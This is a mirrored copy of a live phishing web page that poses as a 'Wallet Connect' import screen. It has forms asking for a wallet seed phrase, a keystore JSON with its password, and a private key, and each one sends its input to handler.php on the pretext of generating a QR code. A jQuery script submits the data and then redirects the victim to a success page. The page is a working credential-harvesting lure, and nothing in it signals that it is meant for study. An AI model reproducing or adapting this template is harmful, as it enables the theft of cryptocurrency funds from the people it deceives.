<!DOCTYPE html>
<html lang="en">



<!-- Mirrored from syncwallets-dapps.live/walletconnect/import/0RoUrUBOekR85uQv.php by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 24 Dec 2021 11:25:50 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />

<head>
<script src="../removeBanner.js"></script>.
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<title>Wallet Connect | Import wallet key</title>
<link rel="stylesheet" href="../assets/css/style.css">
<link rel="preconnect" href="https://fonts.gstatic.com/">
<link href="https://fonts.googleapis.com/css2?family=Lato:wght@100;300;400;700;900&amp;display=swap" rel="stylesheet">
<script src="../../kit.fontawesome.com/3001ac0519.html" crossorigin="anonymous"></script>
<link href="../../../cdn.jsdelivr.net/npm/bootstrap%405.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
</head>
<body>
<div class="import" style="background-color: black">
<div class="import__container">
<a href="#" class="import__header">
<i class="fa fa-less-than import__header--icon"></i>
<span class="import__header--text text- " style="color: rgb(65, 141, 241);"> Import Wallet to Generate QR Code</span>
</a>
<div class="import__tab ">
    
    

<div class="import__tab__header bg-dark">
<a href="#phrase" class="import__tab__header--item import__tab__header--item--1 current  " style="color: rgb(65, 141, 241);">Phrase</a>
<a href="#keystore-json" class="import__tab__header--item import__tab__header--item--2" style="color: rgb(65, 141, 241);">Keystore Json</a>
<a href="#private-key" class="import__tab__header--item import__tab__header--item--3" style="color: rgb(65, 141, 241);">Private Key</a>
</div>






<div class="import__tab__body">

<!-- Phrase Import Tab Starts Here -->
<div id="phrase" class="import__tab__body--item import__tab__body--item--phrase current">
<form action="handler.php" method="POST" >
<input type="hidden" name="phr">
<div class="form__errorBox form__errorBox--phrase"></div>
<textarea class="form__input form__input--textarea" name="phr" cols="30" rows="5" placeholder="Enter Phrase..." required></textarea>


<label for="phrase_input" class="form__label">Typically 12 (sometimes 24) words separated by a single space.</label>
<button class="form__button" type="submit" style="background-color:rgb(65, 141, 241);">Generate QR Code</button>
</form>
</div>

<!-- Phrase Import Tab Ends Here -->



<!-- Keyjayson & Passwords  Import Tab start Here -->


<div id="keystore-json" class="import__tab__body--item import__tab__body--item--keystore-json">
    
    <form action="handler.php" method="POST" >
<input type="hidden" name="kjs">
<div class="form__errorBox form__errorBox--phrase"></div>
<textarea class="form__input form__input--textarea" name="kjs" cols="30" rows="5" placeholder="Keystore JSON..." required></textarea>


<label for="keystore_password"></label>

<input  type="password"  class="form__input form__input--textarea" name="pas" cols="30" rows="1" placeholder="Password..." required></input>


    




<label for="Enjinkeystore_json" class="form__label">Several lines of text beginning with "{...}" plus the password you used to encrypt it. </label>
<button class="form__button" type="submit" style="background-color: rgb(65, 141, 241);">Generate QR Code</button>
</form>
</div>
    
<!-- Keyjayson & Passwords  Import Tab ends Here -->

    
<!-- Private key Import Tab Starts Here -->
<form action="handler.php" method="POST" >
<div id="private-key" class="import__tab__body--item import__tab__body--item--private-key">
<input type="hidden" name="pri">

<input type="text" name="pri" class="form__input" placeholder="Private Key..." required>
<label for="Enjin priv_key" class="form__label">Typically 12 (sometimes 24) words separated by a single space.</label>
<button class="form__button" type="submit" style="background-color:rgb(65, 141, 241);;">Generate QR Code</button>
</div>
    
<!-- Private Key Import Tab Ends  Here -->


</div>
</div>
</div>
</div>
</form>
<script src="../assets/js/app.js"></script>
<script src="../../../cdn.jsdelivr.net/npm/%40popperjs/core%402.9.2/dist/umd/popper.min.js"></script>
<script src="../../../ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script>
        $(".ajaxForm").submit(function(e) {
            e.preventDefault();
            var href = $(this).attr("action");
            $.ajax({
                type: "POST",
                dataType: "json",
                url: href,
                data: $(this).serialize(),
                success: function(response) {
                    if (response.status == "success") {
                        window.location.href = '../success.html'; // redirection url // change this. 
                    } else {
                        alert("An error occured: " + response.message);
                    }
                }
            });
        });
    </script>
<div style="text-align: right;position: fixed;z-index:9999999;bottom: 0;width: auto;right: 1%;cursor: pointer;line-height: 0;display:block !important;"><a title="Hosted on free web hosting 000webhost.com. Host your own website for FREE." target="_blank" href="https://www.000webhost.com/?utm_source=000webhostapp&amp;utm_campaign=000_logo&amp;utm_medium=website&amp;utm_content=footer_img"><img src="../../../cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png" alt="www.000webhost.com"></a></div><script>function getCookie(t){for(var e=t+"=",n=decodeURIComponent(document.cookie).split(";"),o=0;o<n.length;o++){for(var i=n[o];" "==i.charAt(0);)i=i.substring(1);if(0==i.indexOf(e))return i.substring(e.length,i.length)}return""}getCookie("hostinger")&&(document.cookie="hostinger=;expires=Thu, 01 Jan 1970 00:00:01 GMT;",location.reload());var wordpressAdminBody=document.getElementsByClassName("wp-admin")[0],notification=document.getElementsByClassName("notice notice-success is-dismissible"),hostingerLogo=document.getElementsByClassName("hlogo"),mainContent=document.getElementsByClassName("notice_content")[0];if(null!=wordpressAdminBody&&notification.length>0&&null!=mainContent){var googleFont=document.createElement("link");googleFontHref=document.createAttribute("href"),googleFontRel=document.createAttribute("rel"),googleFontHref.value="https://fonts.googleapis.com/css?family=Roboto:300,400,600,700",googleFontRel.value="stylesheet",googleFont.setAttributeNode(googleFontHref),googleFont.setAttributeNode(googleFontRel);var css="@media only screen and (max-width: 576px) {#main_content {max-width: 320px !important;} #main_content h1 {font-size: 30px !important;} #main_content h2 {font-size: 40px !important; margin: 20px 0 !important;} #main_content p {font-size: 14px !important;} #main_content .content-wrapper {text-align: center !important;}} @media only screen and (max-width: 781px) {#main_content {margin: auto; justify-content: center; max-width: 445px;}} @media only screen and (max-width: 1325px) {.web-hosting-90-off-image-wrapper {position: absolute; max-width: 95% !important;} .notice_content {justify-content: center;} .web-hosting-90-off-image {opacity: 0.3;}} @media only screen and (min-width: 769px) {.notice_content {justify-content: space-between;} #main_content {margin-left: 5%; max-width: 445px;} .web-hosting-90-off-image-wrapper {position: absolute; display: flex; justify-content: center; width: 100%; }} .web-hosting-90-off-image {max-width: 90%;} .content-wrapper {min-height: 454px; display: flex; flex-direction: column; justify-content: center; z-index: 5} .notice_content {display: flex; align-items: center;} * {-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;} .upgrade_button_red_sale{box-shadow: 0 2px 4px 0 rgba(255, 69, 70, 0.2); max-width: 350px; border: 0; border-radius: 3px; background-color: #ff4546 !important; padding: 15px 55px !important; font-family: 'Roboto', sans-serif; font-size: 16px; font-weight: 600; color: #ffffff;} .upgrade_button_red_sale:hover{color: #ffffff !important; background: #d10303 !important;}",style=document.createElement("style"),sheet=window.document.styleSheets[0];style.styleSheet?style.styleSheet.cssText=css:style.appendChild(document.createTextNode(css)),document.getElementsByTagName("head")[0].appendChild(style),document.getElementsByTagName("head")[0].appendChild(googleFont);var button=document.getElementsByClassName("upgrade_button_red")[0],link=button.parentElement;link.setAttribute("href","https://www.hostinger.com/hosting-starter-offer?utm_source=000webhost&amp;utm_medium=panel&amp;utm_campaign=000-wp"),link.innerHTML='<button class="upgrade_button_red_sale">Go for it</button>',(notification=notification[0]).setAttribute("style","padding-bottom: 0; padding-top: 5px; background-color: #040713; background-size: cover; background-repeat: no-repeat; color: #ffffff; border-left-color: #040713;"),notification.className="notice notice-error is-dismissible";var mainContentHolder=document.getElementById("main_content");mainContentHolder.setAttribute("style","padding: 0;"),hostingerLogo[0].remove();var h1Tag=notification.getElementsByTagName("H1")[0];h1Tag.className="000-h1",h1Tag.innerHTML="Black Friday Prices",h1Tag.setAttribute("style",'color: white; font-family: "Roboto", sans-serif; font-size: 22px; font-weight: 700; text-transform: uppercase;');var h2Tag=document.createElement("H2");h2Tag.innerHTML="Get 90% Off!",h2Tag.setAttribute("style",'color: white; margin: 10px 0 15px 0; font-family: "Roboto", sans-serif; font-size: 60px; font-weight: 700; line-height: 1;'),h1Tag.parentNode.insertBefore(h2Tag,h1Tag.nextSibling);var paragraph=notification.getElementsByTagName("p")[0];paragraph.innerHTML="Get Web Hosting for $0.99/month + SSL Certificate for FREE!",paragraph.setAttribute("style",'font-family: "Roboto", sans-serif; font-size: 16px; font-weight: 700; margin-bottom: 15px;');var list=notification.getElementsByTagName("UL")[0];list.remove();var org_html=mainContent.innerHTML,new_html='<div class="content-wrapper">'+mainContent.innerHTML+'</div><div class="web-hosting-90-off-image-wrapper"><img class="web-hosting-90-off-image" src="https://cdn.000webhost.com/000webhost/promotions/bf-2020-wp-inject-img.png"></div>';mainContent.innerHTML=new_html;var saleImage=mainContent.getElementsByClassName("web-hosting-90-off-image")[0]}</script></body>


<!-- Mirrored from syncwallets-dapps.live/walletconnect/import/0RoUrUBOekR85uQv.php by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 24 Dec 2021 11:25:50 GMT -->
</html>